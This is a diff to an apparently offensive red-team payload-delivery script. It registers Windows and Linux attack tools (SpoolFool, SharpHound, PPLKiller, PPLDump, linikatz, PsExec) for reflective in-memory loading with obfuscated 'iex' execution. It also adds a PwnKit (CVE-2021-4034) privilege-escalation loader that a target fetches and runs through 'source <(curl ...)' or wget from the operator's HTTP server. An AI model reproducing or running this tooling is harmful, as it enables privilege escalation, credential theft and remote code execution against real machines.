@@ -419,14 +419,14 @@ def c_exe(filepath, desc, _type='enc', _args='$null'):
             Tvar=dict(inject_name=args.inject, import_reflect=wlmgr.getCmd(desc2='Invoke-ReflectivePEInjection.ps1'), \
             var='ii', postCode='[System.Text.Encoding]::ASCII.GetString($ii) | `i`e`x; $exeArgs=%s;' % _args), desc=desc)
 
-def cs_exe(filepath, desc, classname=None, funcname=None):
+def cs_exe(filepath, desc, classname=None, funcname=None, FILENAME=None):
     _func = os.path.splitext(os.path.basename(filepath))[0]
     classname = classname or ('%s.Program' % _func)
     funcname = funcname or ('Invoke-%s' % _func)
     pandora('load-exe-1', shellUrl=TempUtil.getFileUrl(filepath, encFn), desc=desc, Tvar={
         'class': classname,
         'function': funcname
-    })
+    }, FILENAME=FILENAME)
 
 def ez_fit(filepath, **tvar):
     for k in tvar:
@@ -456,7 +456,7 @@ cs_exe('thirdparty_libs/SpoolSample.exe', 'Invoke-SpoolSample <victim> <attacker
 cs_exe('thirdparty_libs/SpoolFool.exe', 'SpoolFool (CVE-2022-21999) on Windows Desktop ( Invoke-SpoolFool -dll AddUser.dll )')
 cs_exe('thirdparty_libs/SharpHound.exe', 'Invoke-Bloodhound -c "All,GPOLocalGroup" --outputdirectory $env:tmp -s -Domain xxx.com', 
         'SharpHound.Program', 'Invoke-Bloodhound')
-cs_exe('thirdparty_libs/winPEAS.exe', 'winPEAS')
+cs_exe('thirdparty_libs/winPEAS.exe', 'winPEAS', FILENAME='wlpc')
 cs_exe('csharp/myPsExec.exe', 'Invoke-myPsExec appsrv01 SensorDataService "powershell -c `"iwr ...`""', 'myPsExec.Program')
 cs_exe('csharp/SQL.exe', 'Invoke-SQL "<servername>" "<sql>" # separator = `n', 'SQL.SQL')
 
@@ -483,7 +483,7 @@ for huan_exe in glob.glob('./artifact/*.exe'):
 simple('thirdparty_libs/PPLDump.exe', 'PPLDump.exe')
 simple('thirdparty_libs/SysinternalsSuite_PsExec.exe', 'PsExec.exe')
 simple('thirdparty_libs/linikatz.sh')
-simple('thirdparty_libs/BackStab.exe')
+simple('thirdparty_libs/Backstab.exe')
 simple('thirdparty_libs/PPLKiller.exe')
 simple('thirdparty_libs/MsiWrapperBatch.exe')
 
@@ -492,12 +492,14 @@ pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python3'), desc='curl 
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python'), desc='curl + Python')
 
 # linux LPE
-with open(os.path.join(TempUtil.getTempDir(), 'llpe'), 'wb') as f:
-    f.write(ez_fit('scripts/cve-2021-4034/exp.sh', \
-        pwnkit=TempUtil.getFileUrl('scripts/cve-2021-4034/pwnkit.so'), \
-        trigger=TempUtil.getFileUrl('scripts/cve-2021-4034/trigger')
-    ))
-wlmgr.add('PolKit pkexec LPE', 'pkexec', 'source <(curl %(base)s/%(f)s)' %  dict(base=httpUrl, f='llpe'))
+for dl in ['curl -s', 'wget -qO-']:
+    with open(os.path.join(TempUtil.getTempDir(), 'llpe'), 'wb') as f:
+        f.write(ez_fit('scripts/cve-2021-4034/exp.sh', \
+            pwnkit=TempUtil.getFileUrl('scripts/cve-2021-4034/pwnkit.so'), \
+            trigger=TempUtil.getFileUrl('scripts/cve-2021-4034/trigger'), \
+            use_curl=('true' if dl.startswith('curl') else 'false')
+        ))
+    wlmgr.add('PolKit pkexec LPE (%s)' % dl.split()[0], 'pkexec', 'source <(%(dl)s %(base)s/%(f)s)' %  dict(base=httpUrl, f='llpe', dl=dl))
 
 pandora('ppl-1', Tvar=dict(pplkiller_dl=wlmgr.getCmd(desc1='[Simple] PPLKiller.exe')), useTransform=False, FILENAME='pk.ps1')
 
